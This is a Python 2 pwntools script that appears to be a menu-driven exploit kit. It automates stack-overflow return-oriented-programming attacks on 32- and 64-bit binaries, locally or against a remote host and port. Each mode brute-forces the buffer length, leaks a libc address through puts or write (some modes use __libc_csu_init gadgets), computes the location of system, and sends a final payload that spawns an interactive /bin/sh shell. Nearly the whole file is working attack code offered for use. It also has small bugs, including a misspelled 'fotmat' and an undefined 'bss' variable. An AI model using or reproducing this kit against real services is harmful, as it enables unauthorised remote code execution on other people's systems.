#!/usr/bin/env python2
#-*-coding:utf8-*-

#developer LeeDoHyun (Namju High School)
#developer seohojin (Semyeong Computer High School)

from pwn import *
import sys

def menu():
	print('=================================')
	print('example')
	print('64bit) puts leak: 1')
	print('64bit) libc csu init leak (puts): 2')
	print('64bit) libc csu init leak (write): 3')
	print('32bit) puts & write: 4')
	print('=================================')

	choice = input('your want exploit shape: ')
	return choice

def puts_exploit():
	binary = raw_input('your binary name: ').rstrip('\n')
	e = ELF('./' + binary)
	pop_rdi = e.symbols['__libc_csu_init'] + 99
	ret = e.symbols['__libc_csu_init'] + 100
	puts_plt = e.plt['puts']
	puts_got = e.got['puts']
	main = e.symbols['main']

	print 'remote: 1, local: 2'
	rl = input('remote and local: ')
	if(rl == 1):
		IP = raw_input('nc server ip addr: ').rstrip('\n')
		PORT = raw_input('nc server port addr: ').rstrip('\n')
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
		if(one == 1):
				libc = ELF('64-libc-2.23.so')
		elif(one == 2):
				libc = ELF('64-libc-2.27.so')

		for i in range(1, 5000):
			r = remote(IP, PORT)

			payload = '\x00'*(int(i))
			payload += p64(pop_rdi)
			payload += p64(puts_got)
			payload += p64(puts_plt)
			payload += p64(main)
			r.sendline(payload)

			try:
				puts_leak = u64(r.recvuntil('\x7f')[-6:] + '\x00\x00')
				base = puts_leak - libc.symbols['puts']
				system = base + libc.symbols['system']
				binsh = base + libc.search('/bin/sh').next()

				print str(payload) + str(p64(puts_leak))
				info('buffer size = {}'.format(str(i)))
				info('puts leak = {}'.format(hex(puts_leak)))
				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))
				info('binsh addr = {}'.format(hex(binsh)))

				payload = '\x00'*(int(i))
				payload += p64(pop_rdi)
				payload += p64(binsh)
				payload += p64(ret)
				payload += p64(system)
				r.sendline(payload)
				r.interactive()
				break
			except:
				print str(payload)
				print ('Fail: {}'.fotmat(str(i)))
				r.close()

	elif(rl == 2):
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
		if(one == 1):
			libc = ELF('64-libc-2.23.so')
		elif(one == 2):
			libc = ELF('64-libc-2.27.so')

		for i in range(1, 5000):
			r = process('./' + binary)
			sleep(0.1)

			payload = '\x00'*(int(i))
			payload += p64(pop_rdi)
			payload += p64(puts_got)
			payload += p64(puts_plt)
			payload += p64(main)
			print r.sendline(payload)

			try:
				puts_leak = u64(r.recvuntil('\x7f')[-6:] + '\x00\x00')
				base = puts_leak - libc.symbols['puts']
				system = base + libc.symbols['system']
				binsh = base + libc.search('/bin/sh').next()

				print str(payload) + str(p64(puts_leak))
				info('buffer size = {}'.format(str(i)))
				info('puts leak = {}'.format(hex(puts_leak)))
				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))
				info('binsh addr = {}'.format(hex(binsh)))

				payload = '\x00'*(int(i))
				payload += p64(pop_rdi)
				payload += p64(binsh)
				payload += p64(ret)
				payload += p64(system)
				r.sendline(payload)
				r.interactive()
				break
			except:
				print str(payload)
				print ('Fail: {}'.format(str(i)))
				r.close()
	else:
		print 'No'
		exit()

def puts_csu_exploit():
	binary = raw_input('your binary name: ').rstrip('\n')
	e = ELF('./' + binary)
	libc_csu_init_gadget1 = e.symbols['__libc_csu_init'] + 90
	libc_csu_init_gadget2 = e.symbols['__libc_csu_init'] + 64
	pop_rdi = e.symbols['__libc_csu_init'] + 99
	ret = e.symbols['__libc_csu_init'] + 100
	puts_got = e.got['puts']
	main = e.symbols['main']

	info('__libc_csu_init gadget1 : {}'.format(hex(libc_csu_init_gadget1)))
	info('__libc_csu_init gadget2 : {}'.format(hex(libc_csu_init_gadget2)))
	info('puts got : {}'.format(hex(puts_got)))
	info('bss addr : {}'.format(hex(bss)))
	info('main addr : {}'.format(hex(main)))

	print 'remote: 1, local: 2'
	rl = input('remote and local: ')

	if(rl == 1):
		IP = raw_input('nc server ip addr: ').rstrip('\n')
		PORT = raw_input('nc server port addr: ').rstrip('\n')
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
		if(one == 1):
			libc = ELF('64-libc-2.23.so')
		elif(one == 2):
			libc = ELF('64-libc-2.27.so')

		for i in range(1, 5000):
			r = remote(IP, PORT)
			sleep(0.1)

			payload = '\x00'*(int(i))
			payload += p64(libc_csu_init_gadget1)
			payload += p64(0)
			payload += p64(1)
			payload += p64(puts_got)
			payload += p64(0)
			payload += p64(0)
			payload += p64(puts_got)

			payload += p64(libc_csu_init_gadget2)
			payload += p64(0) * 7
			payload += p64(main)
			print r.sendline(payload)

			try:
				puts_leak = u64(r.recvuntil('\x7f')[-6:] + '\x00\x00')
				base = puts_leak - libc.symbols['puts']
				system = base + libc.symbols['system']
				binsh = base + libc.search('/bin/sh').next()

				print str(payload) + str(p64(puts_leak))
				info('buffer size = {}'.format(str(i)))
				info('puts leak = {}'.format(hex(puts_leak)))
				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))
				info('binsh addr = {}'.format(hex(binsh)))

				payload = '\x00'*(int(i))
				payload += p64(pop_rdi)
				payload += p64(binsh)
				payload += p64(ret)
				payload += p64(system)
				r.sendline(payload)
				r.interactive()
				break
			except:
				print str(payload)
				print ('Fail: {}'.format(str(i)))
				r.close()

	elif(rl == 2):
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
		if(one == 1):
			libc = ELF('64-libc-2.23.so')
		elif(one == 2):
			libc = ELF('64-libc-2.27.so')

		for i in range(1, 5000):
			r = process('./' + binary)
			sleep(0.1)

			payload = '\x00'*(int(i))
			payload += p64(libc_csu_init_gadget1)
			payload += p64(0)
			payload += p64(1)
			payload += p64(puts_got)
			payload += p64(0)
			payload += p64(0)
			payload += p64(puts_got)

			payload += p64(libc_csu_init_gadget2)
			payload += p64(0) * 7
			payload += p64(main)
			print r.sendline(payload)

			try:
				puts_leak = u64(r.recvuntil('\x7f')[-6:] + '\x00\x00')
				base = puts_leak - libc.symbols['puts']
				system = base + libc.symbols['system']
				binsh = base + libc.search('/bin/sh').next()

				print str(payload) + str(p64(puts_leak))
				info('buffer size = {}'.format(str(i)))
				info('puts leak = {}'.format(hex(puts_leak)))
				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))
				info('binsh addr = {}'.format(hex(binsh)))

				payload = '\x00'*(int(i))
				payload += p64(pop_rdi)
				payload += p64(binsh)
				payload += p64(ret)
				payload += p64(system)
				r.sendline(payload)
				r.interactive()
				break
			except:
				print str(payload)
				print ('Fail: {}'.format(str(i)))
				r.close()
	else:
		print 'No'
		exit()

def write_csu_exploit():
	binary = raw_input('your binary name: ').rstrip('\n')
	e = ELF('./' + binary)
	libc_csu_init_gadget1 = e.symbols['__libc_csu_init'] + 90
	libc_csu_init_gadget2 = e.symbols['__libc_csu_init'] + 64
	pop_rdi = e.symbols['__libc_csu_init'] + 99
	ret = e.symbols['__libc_csu_init'] + 100
	write_got = e.got['write']
	main = e.symbols['main']

	info('__libc_csu_init gadget1 : {}'.format(hex(libc_csu_init_gadget1)))
	info('__libc_csu_init gadget2 : {}'.format(hex(libc_csu_init_gadget2)))
	info('write got : {}'.format(hex(write_got)))
	info('main addr : {}'.format(hex(main)))

	print 'remote: 1, local: 2'
	rl = input('remote and local: ')

	if(rl == 1):
		IP = raw_input('nc server ip addr: ').rstrip('\n')
		PORT = raw_input('nc server port addr: ').rstrip('\n')
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
		if(one == 1):
			libc = ELF('64-libc-2.23.so')
		elif(one == 2):
			libc = ELF('64-libc-2.27.so')

		for i in range(1, 5000):
			r = remote(IP, PORT)
			sleep(0.1)

			payload = '\x00'*(int(i))
			payload += p64(libc_csu_init_gadget1)
			payload += p64(0)
			payload += p64(1)
			payload += p64(write_got)
			payload += p64(8)
			payload += p64(write_got)
			payload += p64(1)

			payload += p64(libc_csu_init_gadget2)
			payload += p64(0) * 7
			payload += p64(main)
			print r.sendline(payload)

			try:
				write_leak = u64(r.recvuntil('\x7f')[-6:] + '\x00\x00')
				base = write_leak - libc.symbols['write']
				system = base + libc.symbols['system']
				binsh = base + libc.search('/bin/sh').next()

				print str(payload) + str(p64(write_leak))
				info('buffer size = {}'.format(str(i)))
				info('write leak = {}'.format(hex(write_leak)))
				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))
				info('binsh addr = {}'.format(hex(binsh)))

				payload = '\x00'*(int(i))
				payload += p64(pop_rdi)
				payload += p64(binsh)
				payload += p64(ret)
				payload += p64(system)
				r.sendline(payload)
				r.interactive()
				break
			except:
				print str(payload)
				print ('Fail: {}'.format(str(i)))
				r.close()

	elif(rl == 2):
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
		if(one == 1):
			libc = ELF('64-libc-2.23.so')
		elif(one == 2):
			libc = ELF('64-libc-2.27.so')

		for i in range(1, 500):
			r = process('./' + binary)
			sleep(0.1)

			payload = '\x00'*(int(i))
			payload += p64(libc_csu_init_gadget1)
			payload += p64(0)
			payload += p64(1)
			payload += p64(write_got)
			payload += p64(8)
			payload += p64(write_got)
			payload += p64(1)

			payload += p64(libc_csu_init_gadget2)
			payload += p64(0) * 7
			payload += p64(main)
			print r.sendline(payload)

			try:
				write_leak = u64(r.recvuntil('\x7f')[-6:] + '\x00\x00')
				base = write_leak - libc.symbols['write']
				system = base + libc.symbols['system']
				binsh = base + libc.search('/bin/sh').next()

				print str(payload) + str(p64(write_leak))
				info('buffer size = {}'.format(str(i)))
				info('write leak = {}'.format(hex(write_leak)))
				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))
				info('binsh addr = {}'.format(hex(binsh)))

				payload = '\x00'*(int(i))
				payload += p64(pop_rdi)
				payload += p64(binsh)
				payload += p64(ret)
				payload += p64(system)
				r.sendline(payload)
				r.interactive()
				break
			except:
				print str(payload)
				print ('Fail: {}'.format(str(i)))
				r.close()
	else:
		print 'No'
		exit()

def rop_32():

	binary = raw_input('your binary name: ').rstrip('\n')

	print 'remote: 1, local: 2'
	rl = input('remote and local: ')

	binsh = '/bin/sh\x00'
	i = 0

	e = ELF('./'+binary)
	rop = ROP(e)
	bss = e.bss()

	if(rl == 1):
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
		if(one == 1):
			libc = ELF('32-libc-2.23.so')
		elif(one == 2):
			libc = ELF('32-libc-2.27.so')

	elif(rl == 2):
		libc = e.libc

	try:
		puts_got = e.got['puts']
		rop.puts(puts_got)
		offset = libc.symbols['puts']
		print('puts_got : {}'.format(hex(puts_got)))

	except:
		write_got = e.got['write']
		rop.write(1,write_got,4)
		offset = libc.symbols['write']
		print('write_got : {}'.format(hex(write_got)))
	try:
		gets_got = e.got['gets']
		rop.gets(bss)
		print('gets_got : {}'.format(hex(gets_got)))
	except:
		read_got = e.got['read']
		rop.read(0,bss,len(binsh))
		print('read_got : {}'.format(hex(read_got)))

	rop.main()

	if(rl == 1):
		IP = raw_input('nc server ip addr: ').rstrip('\n')
		PORT = raw_input('nc server port addr: ').rstrip('\n')
		for i in range(1, 5000):
			r = remote(IP, PORT)
			#e = ELF('./'+binary)

			sleep(0.1)

			payload = '\x00'*(int(i))
			payload += rop.chain()

			r.sendline(payload)

			try:
				leak = u32(r.recvuntil('\xf7')[-4:])

			except:
				i += 1
				print str(payload)
				print ('Fail: {}'.format(str(i)))
				r.close()

			else:
				print('leak : {}'.format(hex(leak)))
				base = leak - offset
				system = base + libc.symbols['system']
				r.send(binsh)

				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))

				payload = '\x00'*(int(i))
				payload += p32(system)
				payload += p32(0)
				payload += p32(bss)

				r.sendline(payload)
				print str(payload) + str(p32(leak))
				r.interactive()
				break

	elif(rl == 2):

		for i in range(1, 5000):
			r = process('./'+binary)
			#e = ELF('./'+binary)

			sleep(0.1)

			payload = '\x00'*(int(i))
			payload += rop.chain()

			r.sendline(payload)

			try:
				leak = u32(r.recvuntil('\xf7')[-4:])

			except:
				i += 1
				print str(payload)
				print ('Fail: {}'.format(str(i)))
				r.close()

			else:
				print('leak : {}'.format(hex(leak)))
				base = leak - offset
				system = base + libc.symbols['system']
				r.send(binsh)

				info('base addr = {}'.format(hex(base)))
				info('system addr = {}'.format(hex(system)))

				payload = '\x00'*(int(i))
				payload += p32(system)
				payload += p32(0)
				payload += p32(bss)

				r.sendline(payload)
				print str(payload) + str(p32(leak))
				r.interactive()
				break
	else:
		print 'No'
		exit()

choice = menu()

if(choice == 1):
	puts_exploit()
elif(choice == 2):
	puts_csu_exploit()
elif(choice == 3):
	write_csu_exploit()
elif(choice == 4):
	rop_32()
else:
	exit()
